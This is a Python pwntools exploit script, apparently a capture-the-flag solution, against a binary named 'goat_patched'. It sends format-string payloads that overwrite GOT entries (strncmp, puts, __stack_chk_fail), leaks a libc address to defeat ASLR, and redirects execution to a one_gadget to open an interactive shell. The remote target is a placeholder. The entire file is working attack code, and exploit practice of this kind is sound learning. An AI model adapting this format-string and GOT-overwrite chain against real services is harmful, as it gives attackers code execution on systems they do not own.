#!/usr/bin/env python3

from pwn import *

exe = ELF("./goat_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def kirimStack(ya,rip_stack,r):

    chunks = [
    (ya >> (16 * 0)) & 0xffff,  # 0x8008
    (ya >> (16 * 1)) & 0xffff,  # 0x5555
    (ya >> (16 * 2)) & 0xffff,  # 0x5555
    (ya >> (16 * 3)) & 0xffff   # 0x0000

]
    ovt_sthck = fmtstr_payload(8,{rip_stack: chunks[0] - 24},write_size='short')
    ovt_sthck2 = fmtstr_payload(8,{rip_stack + 2: chunks[1] - 24},write_size='short')
    ovt_sthck3 = fmtstr_payload(8,{rip_stack + 4: chunks[2] - 24 },write_size='short')
    ovt_sthck4 = fmtstr_payload(8,{rip_stack + 6: chunks[3] - 24},write_size='short')
    r.sendline(ovt_sthck)
    r.sendline("A")
    r.sendline(ovt_sthck2)
    r.sendline("A")
    r.sendline(ovt_sthck3)
    r.sendline("A")
    r.sendline("A")
    r.sendline("A")
    
    # r.sendline(ovt_sthck4)
    # r.sendline("A")


def main():
    r = conn()
    offset = 8
    pay = fmtstr_payload(offset,{exe.got['strncmp'] : exe.sym['main'] - 24},write_size='int')
    # sleep(3)
    r.sendline(pay)
    print(len(pay))
    write("len",str(len(pay)))
    r.sendline("%31$p")
    r.sendline("%57$p")
    # r.recvuntil(b"What's your name? Are you sure? You said:")
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    libc_addr = int(r.recvline().strip().decode(),16)
    libc.address = libc_addr - 0x2718a
    write("addr",str(hex(libc.address)))
    r.sendline("bruh")
    # sleep(3)
    one_gadget = libc.address + 0xd4f5f
    payi = fmtstr_payload(8,{exe.got['strncmp'] : one_gadget},write_size='int')
    write("payi",payi)
    print(len(payi))
    bss = exe.bss() + 0x800
    print(hex(bss))
    print(hex(one_gadget))
    sleep(3)
    kirimStack(one_gadget,exe.got['__stack_chk_fail'],r)
    r.sendline(fmtstr_payload(8,{exe.got['strncmp'] : exe.sym['main'] - 24},write_size='int'))
    r.sendline("A")
    # r.sendline("A")
    # r.sendline("A")
    r.sendline(fmtstr_payload(8,{exe.got['puts'] : exe.sym['main'] + 328},write_size='int'))
    r.sendline("A")
    r.sendline(fmtstr_payload(8,{exe.got['strncmp'] : 0x0000000000401016},write_size='int'))
    # sleep(3)
    # r.sendline(b"\x00" * 8)
    r.interactive()


if __name__ == "__main__":
    main()
